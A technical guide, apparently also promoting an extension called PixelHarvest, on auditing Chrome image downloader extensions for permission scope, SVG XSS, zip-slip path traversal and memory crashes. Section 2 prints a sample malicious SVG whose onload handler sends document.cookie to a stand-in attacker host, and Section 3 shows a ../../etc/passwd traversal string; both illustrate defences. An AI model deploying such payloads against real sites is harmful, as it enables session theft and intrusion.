# How to Audit Chrome Image Downloader Extensions for Manifest V3 Security & Privacy

Browser extensions that extract images and media from webpages are among the most widely installed utilities in the Chrome Web Store. However, because image downloaders interact directly with webpage DOM trees and network assets, poorly architected extensions often introduce severe **privacy leaks**, **broad host permission risks**, **Cross-Site Scripting (XSS) vectors**, and **browser tab Out-Of-Memory (OOM) crashes**.

This technical guide explains what security engineers, IT administrators, and privacy-conscious designers should inspect before installing any Chrome image downloader extension—and how **[PixelHarvest](https://talofer.github.io/pixelharvest/)** implements defense-in-depth guards across every layer.

---

## 1. Permission Footprint: `activeTab` vs. `<all_urls>`

The single most important indicator of an extension's security posture is its `manifest.json` permission declaration.

- **High-Risk Pattern (`<all_urls>` or `*://*/*`):** Grants the extension persistent read/write access to every website you visit—including internal corporate dashboards, banking portals, email clients, and authenticated SaaS tools—even when you never click the extension icon.
- **Zero-Trust Pattern (`activeTab` + `scripting`):** Grants temporary access exclusively to the currently active tab *only* after the user explicitly clicks the extension toolbar button.

**How PixelHarvest Implements This:** PixelHarvest strictly uses `["activeTab", "scripting", "downloads", "storage"]` with **zero `host_permissions`**. It is architecturally incapable of reading browsing history or running background content scripts on uninvoked tabs.

---

## 2. Neutralizing Inline `<svg>` Cross-Site Scripting (XSS)

Many modern websites embed icons, illustrations, and diagrams as inline `<svg>` elements directly in the HTML DOM. A naive image downloader that extracts `<svg>` elements using raw `element.outerHTML` and renders them or saves them unsanitized exposes users to **Stored SVG XSS**:

```xml
<!-- Malicious inline SVG payload on an untrusted page -->
<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://attacker.tld/steal?c='+document.cookie)">
  <script>alert('XSS')</script>
  <a href="javascript:evil()"><circle cx="50" cy="50" r="40"/></a>
</svg>
```

**How PixelHarvest Implements Guard 2 (`src/utils/sanitizer.ts`):**
Before any inline `<svg>` leaves the content script, PixelHarvest parses the markup inside an isolated XML document using `new DOMParser().parseFromString(rawSvg, 'image/svg+xml')`:
1. Rejects malformed `<parsererror>` nodes immediately.
2. Strips all forbidden executable elements (`<script>`, `<foreignObject>`, `<iframe>`, `<object>`, `<embed>`).
3. Removes all inline event handlers (`onload`, `onerror`, `onclick`, `onmouseover`, etc.).
4. Strips `javascript:` and `data:text/html` pseudo-protocol URIs from `href` and `xlink:href` attributes.
5. Enforces explicit `xmlns="http://www.w3.org/2000/svg"` and `viewBox` attributes before serializing via `XMLSerializer`.

---

## 3. Preventing Zip-Slip & Path Traversal on Bulk Downloads

When an extension derives output filenames from remote image URLs (`https://cdn.example.com/assets/../../etc/passwd.webp?token=123`) or Windows reserved device names (`CON.jpg`, `NUL.png`) and feeds those strings directly into a ZIP archive builder, it risks **Zip-Slip path traversal** or filesystem extraction failures.

**How PixelHarvest Implements Guard 3 (`sanitizeFileName`):**
Every file written into `pixelharvest-export.zip` passes through `sanitizeFileName(rawName, index, ext)`:
- Strips query strings (`?`), fragments (`#`), directory traversal sequences (`..`, `/`, `\`), and non-alphanumeric characters.
- Prefix-indexes every file deterministically (`pixelharvest-001-hero-banner.jpg`) and caps total filename length at 48 characters.

---

## 4. Preventing Tab OOM Crashes During 4K Batch Transcoding

Calling `Promise.all()` to decode and canvas-render 25 high-resolution 4K WebP/AVIF images simultaneously spikes GPU and renderer heap memory past Chrome's per-popup limit, crashing the extension popup mid-export.

**How PixelHarvest Implements Guard 1 & Guard 4 (`src/popup/converter.ts`):**
- Uses `fetch(url, { mode: 'cors', credentials: 'omit' })` → `createImageBitmap(blob)` inside a bounded **3-worker semaphore concurrency pool (`MAX_CONCURRENT_JOBS = 3`)**.
- Immediately executes `bitmap.close()`, zeroes out `<canvas>` backing stores (`canvas.width = 0; canvas.height = 0`), and calls `URL.revokeObjectURL()` inside `finally` blocks so memory remains flat across the entire batch.

---

## Summary Checklist for Auditing Any Chrome Media Extension

1. Does `manifest.json` use Manifest V3 without `<all_urls>`?
2. Does image conversion happen 100% locally via HTML5 Canvas (`createImageBitmap`) rather than uploading files to an external server?
3. Are inline `<svg>` nodes sanitized via `DOMParser('image/svg+xml')`?
4. Are ZIP archive filenames sanitized against `../` path traversal?

Explore the live client-side converter and privacy documentation at **[https://talofer.github.io/pixelharvest/](https://talofer.github.io/pixelharvest/)**.
